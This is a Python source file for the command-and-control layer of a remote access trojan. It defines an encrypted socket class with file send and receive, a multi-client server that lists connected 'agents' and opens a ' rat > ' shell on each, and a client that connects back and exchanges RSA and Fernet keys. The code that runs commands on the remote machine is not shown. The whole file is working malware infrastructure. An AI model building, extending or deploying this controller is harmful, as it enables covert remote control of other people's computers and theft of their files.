#!/usr/bin/python3
import socket
import threading
import rsa
from cryptography.fernet import Fernet
SEND_MSG_LEN=2048
RECV_MSG_LEN=4096
from time import sleep

HOSTNAME=socket.gethostname()

# socket class, parent for Server and Client, should not be instantiated by itself
class Socket:
  def __init__(self, host, port):
    self.host = host
    self.port = port
    self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    self.connected = False

  def __str__(self):
    return f"secure socket at ({self.host}:{self.port})"

  def send(self, message, as_bytes=False):
    if as_bytes==False:
      message=str(message).encode('utf-8')
    # split message into a list of packets with max size SEND_MSG_LEN
    packs=[]
    while len(message) > SEND_MSG_LEN:
      packs.append(message[:SEND_MSG_LEN])
      message=message[SEND_MSG_LEN:]
    if len(message)>0:
      packs.append(message)
    # send packets one by one until sending '/' to terminate
    for pack in packs:
      msg=self.key.encrypt(pack)
      self.connection.send(msg)
      sleep(0.1)
    self.connection.send(self.key.encrypt(b'/')) # sending EOF "/"

  def receive(self, as_bytes=False):
    # get packets one by one until getting '/' to terminate
    to_recv=[]
    ended=False
    while not ended:
      msg=self.connection.recv(RECV_MSG_LEN)
      pack=self.key.decrypt(msg)
      ended=pack==b'/'
      if not ended:
        to_recv.append(pack)
    # join all packets together to get the message
    message=b''.join(to_recv)
    if as_bytes:
      return message
    return message.decode('utf-8')

  def send_file(self, filename_src, filename_dst):
    content=b''
    with open(filename_src, 'rb') as file:
      content=file.read()
    self.send(filename_dst)
    self.send(content, as_bytes=True)

  def receive_file(self):
    filename=self.receive()
    content=self.receive(as_bytes=True)
    with open(filename, 'wb') as file:
      file.write(content)

  def disconnect(self):
    if not self.connected:
      return
    try:
      self.send("exit")
    except BrokenPipeError:
      pass
    self.connection.close()
    self.connected = False

class Server(Socket):
  def __init__(self, handle, host="127.0.0.1", port=62832):
    super(Server, self).__init__(host, port)

    self.handle=handle
    self.running=False
    self.public_key, self.private_key = rsa.newkeys(2048)
    self.sock.bind((host, port))
    self.sock.settimeout(1)
    self.sock.listen()
    print(f"[*] Listening on {port}...")
  
  def wait_for_clients(self): # multithreading
    self.clients=[]
    id_cli=1
    while self.running:
      try:
        """
        1 sending rsa public key to client
        2 client sends encrypted symetric key
        3 decrypt symetric key
        4 talk with the same symetric key
        """
        client, addr=self.sock.accept()
        client.send(self.public_key.save_pkcs1())
        client_key=Fernet(rsa.decrypt(client.recv(2048), self.private_key))
        
        # add client to clients list
        self.clients.append({
          'connection':client,
          'key':client_key,
          'name':f'agent{id_cli}',
          'address':addr,
          'ended':False})
        id_cli+=1
      except TimeoutError:
        pass
  
  def list_clients(self):
    print('running agents:')
    for client in self.clients:
      if not client['ended']:
        print(f"{client['name']} : {client['address']}")
  
  def delete(self, name):
    for client in self.clients:
      if client['name']==name:
        client['ended']=True
        self.connection=client['connection']
        self.key=client['key']
        self.send('delete')
        self.connection.close()
        return

  def use(self, client): # run commands to use the specified client
    self.connection=client['connection']
    self.key=client['key']
    name=client['name']
    using=True
    while using:
      cmd=input(f" rat {name} > ")
      using=self.handle(self, cmd)

  def interact(self, name): # search for given client and use it
    for client in self.clients:
      if (not client['ended']) and client['name']==name:
        self.use(client)
        return
    print('no such agent.')

  def run(self):
    self.running=True
    # starting main thread
    self.waitcli=threading.Thread(target=self.wait_for_clients)
    self.waitcli.start()
    exited=False
    while not exited:
      cmd=input(' rat > ')
      exited=cmd=='exit'
      if cmd=='sessions':
        self.list_clients()
      elif cmd.split(' ')[0] == 'delete' and len(cmd.split(' '))>1:
        self.delete(cmd.split(' ')[1])
      elif cmd.split(' ')[0] == 'interact' and len(cmd.split(' '))>1:
        self.interact(cmd.split(' ')[1])
      else:
        print("""
sessions : prints all connected clients
interact : use the specified client
delete   : delete the specified client
""")
  
  def stop(self):
    self.running=False
    # join all subprocesses and end
    if self.waitcli:
      self.waitcli.join()
    for client in self.clients:
      if not client['ended']:
        self.delete(client['name'])
    if self.sock:
      self.sock.close()

class Client(Socket):
  def __init__(self, host="127.0.0.1", port=62832):
    super(Client, self).__init__(host, port)
    
    self.sock.connect((host, port))
    self.connection=self.sock
    self.connected = True
    """
    1 getting server rsa public key
    2 generate symetric key
    3 send it encrypted to server
    4 talk with the same symetric key
    """
    
    connection_key=rsa.PublicKey.load_pkcs1(self.connection.recv(2048))
    key = Fernet.generate_key()
    encrypted_key=rsa.encrypt(key, connection_key)
    self.connection.send(encrypted_key)
    self.key = Fernet(key)

  def get_params(self):
    return self.receive().split(" ")
